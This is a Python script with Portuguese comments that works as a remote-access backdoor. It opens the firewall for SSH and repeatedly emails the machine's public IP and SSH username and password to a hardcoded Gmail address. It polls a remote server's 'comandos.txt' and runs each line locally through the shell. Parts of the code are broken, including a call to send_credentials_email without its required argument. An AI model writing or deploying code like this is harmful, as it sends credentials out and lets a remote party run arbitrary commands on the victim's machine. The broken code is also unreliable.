import paramiko
import subprocess
import platform
from datetime import datetime
import time

# Configurações do servidor SSH
hostname = 'IP_SERVIDOR_SSH'  # Insira o endereço IP ou o nome do host do servidor SSH
port = 22  # Porta padrão do SSH
username = 'USUARIO_SSH'  # Nome de usuário do SSH
password = 'SENHA_SSH'  # Senha do usuário SSH

# Configurações do email
email_recipient = 'efraim.alima@gmail.com'  # Endereço de email do destinatário

def get_public_ip():
    # Obtém o endereço IP público usando um comando shell específico para cada sistema operacional
    if platform.system() == 'Windows':
        command = "curl -s https://api.ipify.org"
    else:
        command = "curl -s https://api.ipify.org"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    ip_address = result.stdout.strip()
    return ip_address

def send_email(ip_address):
    # Envia o endereço IP público para o email especificado
    subject = 'IP Público do Servidor SSH'
    body = f'O endereço IP público do servidor SSH é: {ip_address}'

    # Comando para enviar email usando o utilitário sendmail (ou similar) específico para cada sistema operacional
    if platform.system() == 'Windows':
        command = f"echo 'Subject: {subject}\n\n{body}' | sendmail -f {email_recipient} {email_recipient}"
    else:
        command = f"echo 'Subject: {subject}\n\n{body}' | sendmail -f {email_recipient} {email_recipient}"

    # Executa o comando shell para enviar o email
    subprocess.run(command, shell=True)

def execute_command(command):
    # Executa o comando no servidor usando o módulo subprocess e o comando shell específico para cada sistema operacional
    if platform.system() == 'Windows':
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
    else:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, executable="/bin/bash")

    # Verifica se o comando foi executado com sucesso
    if result.returncode == 0:
        return True
    else:
        return False

def allow_ssh_port(port):
    # Verifica o sistema operacional e executa o comando específico para adicionar uma regra no firewall
    if platform.system() == 'Windows':
        command = f"netsh advfirewall firewall add rule name='SSH' dir=in action=allow protocol=TCP localport={port}"
    else:
        command = f"sudo iptables -A INPUT -p tcp --dport {port} -j ACCEPT"

    # Executa o comando shell para adicionar a regra
    subprocess.run(command, shell=True)

# Função para enviar as credenciais por email
def send_credentials_email(ip_address):
    # Configurações do email
    email_recipient = 'efraim.alima@gmail.com'  # Endereço de email do destinatário
    email_subject = f"""Credenciais SSH - {ip_address}  
    """
    email_body = f'Usuário: {username}\nSenha: {password}'

    # Comando para enviar o email usando o utilitário sendmail
    sendmail_command = f"echo 'Subject: {email_subject}\n\n{email_body}' | sendmail -f {email_recipient} {email_recipient}"

    # Executa o comando shell para enviar o email
    subprocess.run(sendmail_command, shell=True)

# Chamar a função para enviar as credenciais por email
send_credentials_email()

def establish_ssh_connection():
    # Estabelece uma conexão SSH com o servidor configurado
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Conecta-se ao servidor SSH
        client.connect(hostname, port, username, password)

        # Permitir a porta SSH no firewall (substitua '22' pela porta que você está usando)
        allow_ssh_port(22)

        while True:
            # Executa um comando remoto para obter o endereço IP público
            stdin, stdout, stderr = client.exec_command('curl -s https://api.ipify.org')
            ip_address = stdout.read().decode().strip()

            # Envia o endereço IP público por email
            send_email(ip_address)
            send_credentials_email(ip_address)

            # Verifica se há comandos recebidos
            stdin, stdout, stderr = client.exec_command('cat comandos.txt')
            comandos = stdout.read().decode().strip().splitlines()

            if comandos:
                # Processa os comandos recebidos
                for comando in comandos:
                    # Executa o comando
                    executado = execute_command(comando)

                    # Armazena o comando, data e hora e status em um objeto
                    comando_executado = {
                        'comando': comando,
                        'data_hora': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'executado': executado
                    }

                    # Faça o que for necessário com o objeto do comando executado
                    # ...

            # Aguarda um intervalo antes de verificar novamente
            time.sleep(5)  # Verificar a cada 5 segundos

        # Fecha a conexão SSH
        client.close()
    except Exception as e:
        print(f'Erro ao estabelecer a conexão SSH: {str(e)}')

# Chama a função para estabelecer a conexão SSH e iniciar o loop de verificação de comandos
establish_ssh_connection()
